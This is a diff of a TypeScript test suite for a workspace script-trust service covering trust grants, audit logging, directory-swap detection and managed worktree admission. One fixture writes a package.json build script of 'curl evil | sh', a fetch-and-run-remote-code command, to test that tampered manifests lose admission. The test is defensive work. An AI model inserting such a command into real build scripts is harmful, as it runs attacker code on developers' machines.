@@ -5,6 +5,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { DatabaseSync } from "node:sqlite";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import { activityLogEventRegistration } from "@oscharko-dev/keiko-contracts/runtime/observability";
 import { createInMemoryEvidenceStore } from "@oscharko-dev/keiko-evidence";
 import type { SpawnFn } from "@oscharko-dev/keiko-tools";
 import {
@@ -18,12 +19,19 @@ import { createVerificationRunnerManager } from "./editor/verificationRunner.js"
 import { inspectWorkspaceRootIdentity } from "./workspace-root-identity.js";
 import { deriveWorkspaceRootRef } from "./workspaceTrust/canonicalTrustIdentity.js";
 import { createInMemoryUiStore, createNodeUiStore, type UiStore } from "./store/index.js";
+import type { ServerLogEvent } from "./observability/index.js";
+import { UNKNOWN_CORRELATION_ID } from "./correlation.js";
 import { restoreV13SchemaFixture } from "./store/legacySchemaTestFixture.js";
 import {
   createWorkspaceScriptTrustService,
   WorkspaceScriptTrustError,
   type WorkspaceScriptTrustService,
+  type WorkspaceRunManifestAdmissionRefusal,
 } from "./workspace-script-trust.js";
+import {
+  expectActivityLogProof,
+  formatActivityLogProofLine,
+} from "../../../tests/support/activity-log-proof.js";
 
 const MANIFEST = JSON.stringify({
   name: "fixture",
@@ -85,13 +93,28 @@ function isMutatedBinding(value: unknown): value is MutatedBinding {
     typeof value.manifestRevision === "number"
   );
 }
-// Wrap the two-step realpath+inspect chain so the intermediate `string` type is explicit at the
+// Wraps the two-step realpath+inspect chain so the intermediate `string` type is explicit at the
 // call site. Even though nodeWorkspaceFs.realPath is typed by @oscharko-dev/keiko-workspace,
-// type-aware ESLint's no-unsafe-* rules can surface `error`-typed views of an isolated call —
-// the local binding pins the type and keeps the callers unambiguous.
-function identityDigestFor(fsPath: string): string {
+// type-aware ESLint's no-unsafe-* rules can surface `error`-typed views of an isolated call — the
+// local binding pins the type and keeps the callers unambiguous.
+/**
+ * The proof that a replacement really produced a DIFFERENT filesystem object.
+ *
+ * Not `identityDigest`: that is `H(path, dev, ino, mode, uid)`, and across a same-path replacement
+ * the path, device and uid are constant — so it reduces to `(ino, mode)`, which is the inode
+ * comparison with a permission bit bolted on rather than something stronger than it. Measured on
+ * Linux across 50 delete-and-recreate cycles: the inode is reused 50/50 in both cases, and the mode
+ * changes only because `mkdtempSync` creates at 0700 while `mkdirSync` inherits the umask. At
+ * `umask 022` the digest therefore changes for the permission bit alone; at `umask 077` it is
+ * unchanged 50/50 and the proof-of-swap assertion fails deterministically ON A CORRECT PRODUCT, for
+ * every developer or image with a hardened umask.
+ *
+ * `objectIdentityDigest` is `H(dev, ino, birthtimeNs)`. Creation time is what a recreated directory
+ * cannot inherit, so this holds on any umask.
+ */
+function objectIdentityDigestFor(fsPath: string): string | undefined {
   const canonical: string = nodeWorkspaceFs.realPath(fsPath);
-  return inspectWorkspaceRootIdentity(canonical).identityDigest;
+  return inspectWorkspaceRootIdentity(canonical).objectIdentityDigest;
 }
 
 // A store whose project is registered under `projectPath` verbatim, for the cases that need the
@@ -302,6 +325,57 @@ describe("WorkspaceScriptTrustService", () => {
     expect(
       verification.discover(root).kinds.find((entry) => entry.kind === "typecheck")?.trustState,
     ).toBe("approval-required");
+  });
+
+  // F64 (PR #3452): the human grant is the decision every later verification of this root rests on
+  // (and, for a managed worktree, every run admission). It used to leave no activity line, so run 20's
+  // log could not show the grant its verifications depended on.
+  it("records every human grant and revoke body-free under the request's correlation id", () => {
+    const records: ServerLogEvent[] = [];
+    const trust = createWorkspaceScriptTrustService({
+      store,
+      activityLog: { write: (event: ServerLogEvent): void => void records.push(event) },
+    });
+
+    trust.grant(root, "request-grant");
+    trust.revoke(root);
+
+    expect(records).toEqual([
+      expect.objectContaining({
+        category: "security",
+        op: "workspace-script-trust.granted",
+        correlationId: "request-grant",
+        extra: {
+          basis: "known",
+          manifestDigest: expect.stringMatching(/^[0-9a-f]{64}$/u) as unknown,
+          revision: expect.any(Number) as unknown,
+          completeness: "complete",
+          loss: "none",
+        },
+      }),
+      expect.objectContaining({
+        category: "security",
+        op: "workspace-script-trust.revoked",
+        correlationId: UNKNOWN_CORRELATION_ID,
+        extra: expect.objectContaining({ basis: "known" }) as unknown,
+      }),
+    ]);
+    for (const record of records) {
+      expect(
+        activityLogEventRegistration(record as unknown as Readonly<Record<PropertyKey, unknown>>),
+      ).toBeDefined();
+    }
+    expect(JSON.stringify(records)).not.toContain(root);
+    const provenGrant = expectActivityLogProof(
+      "workspace-script-trust.granted.line",
+      formatActivityLogProofLine(records[0] ?? {}),
+    );
+    expect(provenGrant).toMatchObject({ basis: "known" });
+    const provenRevoke = expectActivityLogProof(
+      "workspace-script-trust.revoked.line",
+      formatActivityLogProofLine(records[1] ?? {}),
+    );
+    expect(provenRevoke).toMatchObject({ basis: "known" });
   });
 
   it("projects server-owned status and preserves an honest digest-invalidation reason", () => {
@@ -614,16 +688,16 @@ describe("WorkspaceScriptTrust fail-closed matrix", () => {
     const trust = createWorkspaceScriptTrustService({ store });
     trust.grant(root);
     expect(typecheckTrustState(trust)).toBe("trusted");
-    // Use the SUT's own identity digest as the proof-of-swap. Inode comparison is unreliable on
-    // ext4 (recycled after rmSync+mkdirSync), while identityDigest is the same key the trust
-    // decision compares — if it changes, the SUT is guaranteed to observe a different object.
-    const originalIdentityDigest = identityDigestFor(root);
+    // Proof of swap, on the one key a recreated directory cannot reproduce: creation time. See
+    // objectIdentityDigestFor — the path/mode digest reduces to (inode, mode) here and is unchanged
+    // under a hardened umask, which would make this row a deterministic false red.
+    const originalObjectIdentity = objectIdentityDigestFor(root);
+    expect(originalObjectIdentity).toBeDefined();
 
     rmSync(root, { recursive: true, force: true });
-    mkdirSync(root, { recursive: true });
+    mkdirSync(root, { recursive: true, mode: 0o700 });
     writeFileSync(join(root, "package.json"), MANIFEST, "utf8");
-    const newIdentityDigest = identityDigestFor(root);
-    expect(newIdentityDigest).not.toBe(originalIdentityDigest);
+    expect(objectIdentityDigestFor(root)).not.toBe(originalObjectIdentity);
 
     expect(typecheckTrustState(trust)).toBe("approval-required");
     const row = store.readWorkspaceTrustRecord(rootReference());
@@ -706,11 +780,14 @@ describe("WorkspaceScriptTrust fail-closed matrix", () => {
       expect(trust.grant(bare)).toEqual({ trusted: true });
       expect(trust.trustLevelForRoot(bare)).toBe("trusted");
 
-      const originalIdentityDigest = identityDigestFor(bare);
+      // Same proof-of-swap key as the sibling row, and for the same reason: the path/mode digest is
+      // unchanged under a hardened umask and would fail here on a correct product.
+      const originalObjectIdentity = objectIdentityDigestFor(bare);
+      expect(originalObjectIdentity).toBeDefined();
       rmSync(bare, { recursive: true, force: true });
-      mkdirSync(bare, { recursive: true });
+      mkdirSync(bare, { recursive: true, mode: 0o700 });
       // Still no package.json: the basis stays `absent` across the swap, which is the whole point.
-      expect(identityDigestFor(bare)).not.toBe(originalIdentityDigest);
+      expect(objectIdentityDigestFor(bare)).not.toBe(originalObjectIdentity);
 
       expect(trust.trustLevelForRoot(bare)).toBe("restricted");
       const row = store.readWorkspaceTrustRecord(bareRef);
@@ -759,7 +836,7 @@ describe("WorkspaceScriptTrust fail-closed matrix", () => {
     const dir = mkdtempSync(join(tmpdir(), "keiko-script-trust-regrant-"));
     const dbPath = join(dir, "ui.db");
     const before = createNodeUiStore(dbPath);
-    let invalidatedRevision = -1;
+    let invalidatedRevision: number;
     try {
       before.createProject(root, "fixture");
       const granted = createWorkspaceScriptTrustService({ store: before });
@@ -843,6 +920,7 @@ describe("WorkspaceScriptTrust fail-closed matrix", () => {
     const stubFs: WorkspaceFs = { ...nodeWorkspaceFs, realPath: (): string => fakeRoot };
     const workspace: WorkspaceInfo = {
       root: fakeRoot,
+      selectedRoot: fakeRoot,
       name: undefined,
       version: undefined,
       testFramework: "unknown",
@@ -995,5 +1073,355 @@ describe("WorkspaceScriptTrust invalidation reasons", () => {
       binding.manifestRevision += 5;
     });
     expect(reason).toBe("human-grant");
+  });
+});
+
+// Production keeps managed task worktrees under `<stateDir>/ui/task-workspaces` — below `.keiko`, a
+// segment the user-workspace deny list refuses as a workspace root. Deriving a worktree's trust from
+// its repository re-admitted the worktree through `detectWorkspaceAt`'s user-workspace root rules,
+// so on every installation with the default state directory a trusted repository could not be bound
+// at all: provisioning failed PROVISIONING_FAILED after `git worktree add` had succeeded, and the
+// worktree was rolled back again (oscharko/Wegwerf-Repo-Final#1, run 1, 2026-09-10). A registered
+// project below the CONFIGURED managed root is a managed task worktree whose workspace root is the
+// worktree root by construction; the service admits it by managed containment, never by path shape.
+describe("managed task worktrees below the state directory", () => {
+  interface ManagedFixture {
+    readonly managedRoot: string;
+    readonly repositoryRoot: string;
+    readonly worktreeRoot: string;
+    readonly deniedOutsider: string;
+  }
+
+  function managedFixture(): ManagedFixture {
+    const stateDir = realpathSync(mkdtempSync(join(tmpdir(), "keiko-trust-state-")));
+    const managedRoot = join(stateDir, ".keiko", "ui", "task-workspaces");
+    const repositoryRoot = realpathSync(mkdtempSync(join(tmpdir(), "keiko-trust-repo-")));
+    const worktreeRoot = join(managedRoot, "repo_1", "ws_1");
+    const deniedOutsider = join(stateDir, ".keiko", "elsewhere", "project");
+    const manifest = JSON.stringify({ name: "shared", scripts: { test: "vitest run" } });
+    for (const directory of [managedRoot, worktreeRoot, deniedOutsider]) {
+      mkdirSync(directory, { recursive: true });
+    }
+    for (const directory of [repositoryRoot, worktreeRoot, deniedOutsider]) {
+      writeFileSync(join(directory, "package.json"), manifest);
+    }
+    fixtureDirs.push(stateDir, repositoryRoot);
+    return { managedRoot, repositoryRoot, worktreeRoot, deniedOutsider };
+  }
+
+  const fixtureDirs: string[] = [];
+
+  afterEach(() => {
+    for (const directory of fixtureDirs.splice(0))
+      rmSync(directory, { recursive: true, force: true });
+  });
+
+  it("derives and reports trust for a registered worktree below the configured managed root", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+      });
+
+      expect(trust.grant(fixture.repositoryRoot)).toEqual({ trusted: true });
+      expect(trust.deriveFromTrustedRoot(fixture.worktreeRoot, fixture.repositoryRoot)).toEqual({
+        trusted: true,
+      });
+      expect(trust.status(fixture.worktreeRoot)).toMatchObject({
+        projectId: fixture.worktreeRoot,
+        trust: "trusted",
+        reason: "derived-from-trusted-root",
+      });
+      expect(trust.trustLevelForRoot(fixture.worktreeRoot)).toBe("trusted");
+      expect(trust.revoke(fixture.worktreeRoot)).toEqual({ trusted: false });
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  // ADR-0147 D3, autonomous-delivery amendment (owner decision, 2026-09-10): a manifest the run's own
+  // governed effect left behind is admitted for that run under the repository's standing grant. The
+  // admission binds the exact bytes, is keyed by the registered canonical root, leaves a body-free
+  // line, and ends with the run — by revocation or by the run's authority expiring.
+  it("admits the worktree's current manifest for a run and drops it on drift, expiry and revocation", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    const events: ServerLogEvent[] = [];
+    let nowMs = Date.parse("2026-09-10T19:00:00.000Z");
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+        activityLog: { write: (event): void => void events.push(event) },
+        now: () => nowMs,
+      });
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+
+      const rewritten = JSON.stringify({ name: "rewritten", scripts: { build: "vite build" } });
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), rewritten);
+      const admission = trust.admitRunManifest(
+        fixture.worktreeRoot,
+        "run-trust-0001",
+        "2026-09-10T20:00:00.000Z",
+        "request-script-trust-0001",
+      );
+      expect(admission).toEqual({ basis: "known", manifestDigest: expect.any(String) as string });
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+      expect(events).toContainEqual(
+        expect.objectContaining({
+          category: "security",
+          op: "workspace-script-trust.run-manifest-admitted",
+          correlationId: "run-trust-0001",
+          parentCorrelationId: "request-script-trust-0001",
+          extra: {
+            basis: "known",
+            manifestDigest: admission?.manifestDigest,
+            expiresAt: "2026-09-10T20:00:00.000Z",
+            completeness: "complete",
+            loss: "none",
+          },
+        }),
+      );
+      expect(JSON.stringify(events)).not.toContain("vite build");
+      const admittedLine = events.find(
+        (event) => event.op === "workspace-script-trust.run-manifest-admitted",
+      );
+      const provenAdmitted = expectActivityLogProof(
+        "workspace-script-trust.run-manifest-admitted.line",
+        formatActivityLogProofLine(admittedLine ?? {}),
+      );
+      expect(provenAdmitted).toMatchObject({ basis: "known" });
+
+      // Bytes changed by anything other than a governed effect no longer match the admission.
+      writeFileSync(
+        join(fixture.worktreeRoot, "package.json"),
+        JSON.stringify({ name: "rewritten", scripts: { build: "curl evil | sh" } }),
+      );
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), rewritten);
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+
+      // The admission expires with the run's authority.
+      nowMs = Date.parse("2026-09-10T20:00:00.000Z");
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      nowMs = Date.parse("2026-09-10T19:00:00.000Z");
+      trust.admitRunManifest(fixture.worktreeRoot, "run-trust-0001", "2026-09-10T20:00:00.000Z");
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+
+      // And with the run itself; a second run's admissions are untouched by the first run's end.
+      expect(trust.revokeRunAdmissions("run-trust-0002")).toBe(0);
+      expect(trust.revokeRunAdmissions("run-trust-0001", "request-script-revoke-0001")).toBe(1);
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      expect(events).toContainEqual(
+        expect.objectContaining({
+          op: "workspace-script-trust.run-manifest-revoked",
+          correlationId: "run-trust-0001",
+          parentCorrelationId: "request-script-revoke-0001",
+          extra: { count: 1, completeness: "complete", loss: "none" },
+        }),
+      );
+      const revokedLine = events.find(
+        (event) => event.op === "workspace-script-trust.run-manifest-revoked",
+      );
+      const provenRevoked = expectActivityLogProof(
+        "workspace-script-trust.run-manifest-revoked.line",
+        formatActivityLogProofLine(revokedLine ?? {}),
+      );
+      expect(provenRevoked).toMatchObject({ count: 1 });
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  it("admits nothing for an unregistered root, an unreadable manifest or an expired authority", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    const events: ServerLogEvent[] = [];
+    function expectRefusalLogged(reason: WorkspaceRunManifestAdmissionRefusal): void {
+      const line = events.at(-1);
+      expect(line).toMatchObject({
+        op: "workspace-script-trust.run-manifest-not-admitted",
+        correlationId: "run-trust-0001",
+        errorKind: "authority-denied",
+        extra: { reason, completeness: "complete", loss: "none" },
+      });
+      const proven = expectActivityLogProof(
+        "workspace-script-trust.run-manifest-not-admitted.line",
+        formatActivityLogProofLine(line ?? {}),
+      );
+      expect(proven).toMatchObject({ reason });
+    }
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+        activityLog: { write: (event): void => void events.push(event) },
+        now: () => Date.parse("2026-09-10T19:00:00.000Z"),
+      });
+      // The worktree is not a registered project yet.
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-trust-0001", "2026-09-10T20:00:00.000Z"),
+      ).toBeUndefined();
+      expectRefusalLogged("root-unregistered");
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      // Authority already expired: nothing to admit under it.
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-trust-0001", "2026-09-10T18:00:00.000Z"),
+      ).toBeUndefined();
+      expectRefusalLogged("authority-expired");
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-trust-0001", "not-an-instant"),
+      ).toBeUndefined();
+      expectRefusalLogged("authority-expired");
+      // An unparseable manifest is an unknown basis and admits nothing.
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), "{ not json");
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-trust-0001", "2026-09-10T20:00:00.000Z"),
+      ).toBeUndefined();
+      expectRefusalLogged("manifest-unreadable");
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      // No manifest at all is a legitimate, admitted basis (no package scripts to run).
+      rmSync(join(fixture.worktreeRoot, "package.json"));
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-trust-0001", "2026-09-10T20:00:00.000Z"),
+      ).toEqual({ basis: "absent" });
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  it("still refuses a denied root that lies outside the configured managed root", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.deniedOutsider, "outsider");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+      });
+
+      expect(trust.grant(fixture.repositoryRoot)).toEqual({ trusted: true });
+      expect(() => trust.grant(fixture.deniedOutsider)).toThrow();
+      expect(() =>
+        trust.deriveFromTrustedRoot(fixture.deniedOutsider, fixture.repositoryRoot),
+      ).toThrow();
+      expect(trust.trustLevelForRoot(fixture.deniedOutsider)).toBe("restricted");
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  // Boundary and malformed inputs fail closed: an empty or relative project id resolves to no
+  // registered project, and the managed root ITSELF — the parent of every worktree, never a
+  // worktree — is not admitted by containment (nothing "stays inside" it), so it falls back to the
+  // user-workspace rules and is refused like any other `.keiko` path.
+  it("fails closed for an empty or malformed project id and for the managed root itself", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.managedRoot, "managed-root-itself");
+      writeFileSync(join(fixture.managedRoot, "package.json"), JSON.stringify({ name: "root" }));
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+      });
+      expect(trust.grant(fixture.repositoryRoot)).toEqual({ trusted: true });
+
+      for (const projectId of ["", "relative/worktree", "   "]) {
+        expect(() => trust.grant(projectId)).toThrow(/Project not found/u);
+        expect(() => trust.deriveFromTrustedRoot(projectId, fixture.repositoryRoot)).toThrow(
+          /Project not found/u,
+        );
+        expect(trust.trustLevelForRoot(projectId)).toBe("restricted");
+      }
+      expect(() => trust.grant(fixture.managedRoot)).toThrow();
+      expect(() =>
+        trust.deriveFromTrustedRoot(fixture.managedRoot, fixture.repositoryRoot),
+      ).toThrow();
+      expect(trust.trustLevelForRoot(fixture.managedRoot)).toBe("restricted");
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  it("admits nothing by path shape when no managed root is configured", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      const trust = createWorkspaceScriptTrustService({ store: managedStore });
+
+      expect(trust.grant(fixture.repositoryRoot)).toEqual({ trusted: true });
+      expect(() =>
+        trust.deriveFromTrustedRoot(fixture.worktreeRoot, fixture.repositoryRoot),
+      ).toThrow();
+      expect(trust.trustLevelForRoot(fixture.worktreeRoot)).toBe("restricted");
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  // ADR-0147 D3 (2026-09-10): the decision consumers ask once a repository's grant has stopped
+  // covering its worktree. Only the operator's OWN grant for the worktree's current bytes answers
+  // true — a derived record inherits the repository's grant and has to stop with it — and drift
+  // after the grant invalidates it exactly as on every other decision path.
+  it("holds a human grant for a registered worktree only while its own manifest is that grant's basis", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+      });
+      expect(trust.grant(fixture.repositoryRoot)).toEqual({ trusted: true });
+      expect(trust.deriveFromTrustedRoot(fixture.worktreeRoot, fixture.repositoryRoot)).toEqual({
+        trusted: true,
+      });
+      // Derived: trusted, but not the operator's own decision about this root.
+      expect(trust.trustLevelForRoot(fixture.worktreeRoot)).toBe("trusted");
+      expect(trust.holdsHumanGrantForRoot(fixture.worktreeRoot)).toBe(false);
+
+      // The run rewrites the worktree manifest; the operator then grants exactly those bytes.
+      const rewritten = (build: string): string =>
+        JSON.stringify({ name: "shared", scripts: { test: "vitest run", build } });
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), rewritten("vite build"));
+      expect(trust.holdsHumanGrantForRoot(fixture.worktreeRoot)).toBe(false);
+      expect(trust.grant(fixture.worktreeRoot)).toEqual({ trusted: true });
+      expect(trust.holdsHumanGrantForRoot(fixture.worktreeRoot)).toBe(true);
+      expect(trust.status(fixture.worktreeRoot)).toMatchObject({
+        trust: "trusted",
+        reason: "human-grant",
+      });
+
+      // A further rewrite: the grant no longer describes the bytes and is invalidated.
+      writeFileSync(
+        join(fixture.worktreeRoot, "package.json"),
+        rewritten("vite build && node ./post.js"),
+      );
+      expect(trust.holdsHumanGrantForRoot(fixture.worktreeRoot)).toBe(false);
+      expect(trust.status(fixture.worktreeRoot)).toMatchObject({
+        trust: "restricted",
+        reason: "trust-basis-changed",
+      });
+
+      // Unregistered and denied roots never hold one.
+      expect(trust.holdsHumanGrantForRoot(join(fixture.managedRoot, "repo_9", "ws_9"))).toBe(false);
+      expect(trust.holdsHumanGrantForRoot(fixture.deniedOutsider)).toBe(false);
+    } finally {
+      managedStore.close();
+    }
   });
 });
